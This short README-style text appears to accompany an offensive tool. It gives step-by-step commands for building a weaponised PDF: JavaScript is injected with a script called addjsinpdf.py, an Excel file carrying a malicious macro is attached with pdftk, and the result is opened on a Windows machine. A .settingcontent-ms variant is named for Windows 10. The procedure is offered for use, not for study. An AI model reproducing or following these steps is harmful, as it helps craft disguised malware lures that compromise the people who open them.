Place a legitimate PDF as "01.pdf" and a excel file "malicious.xls" containing malicious macro in the current directory.

Execute following commands in Kali:
apt-get install pdftk
python addjsinpdf.py
pdftk 02.pdf attach_file malicious.xls output final.pdf

Open "final.pdf" in windows machine.

NOTE: For Win10 instead of excel we can use "malicius.settingcontent-ms", if so edit "addjsinpdf.py" as well.
